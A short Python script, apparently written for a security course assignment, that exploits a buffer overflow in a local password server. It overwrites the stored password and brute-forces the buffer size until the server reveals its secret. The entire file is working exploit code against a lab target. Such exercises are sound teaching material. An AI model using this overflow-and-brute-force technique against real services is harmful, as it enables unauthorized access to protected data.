#!/usr/bin/env python3
import socket
import sys

HOST = "127.0.0.1"

def try_payload(port: int, buf_guess: int) -> str | None:
    # overwrite globals.password with "hack" + '\0'
    fake = b"hack\x00"
    # layout: [buffer (buf_guess bytes)] [password (16 bytes)]
    # send fake password in buffer, pad to reach password, then write fake again
    payload = fake
    if len(payload) < buf_guess:
        payload += b"A" * (buf_guess - len(payload))
    payload += fake  # overwrite password
    payload += b"\n"

    with socket.create_connection((HOST, port), timeout=2) as s:
        _ = s.recv(1024)  # "Password: "
        s.sendall(payload)
        data = s.recv(4096)
        text = data.decode(errors="replace")
        if "The secret is:" in text:
            return text.strip()
    return None

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <port>")
        sys.exit(2)

    port = int(sys.argv[1])

    # brute BUFSZ like your assignment idea (8..128)
    for guess in range(8, 129):
        out = try_payload(port, guess)
        if out:
            print(f"[+] BUFSZ guess = {guess}")
            print(out)
            return
    print("[-] exploit failed (target likely patched or different layout)")

if __name__ == "__main__":
    main()
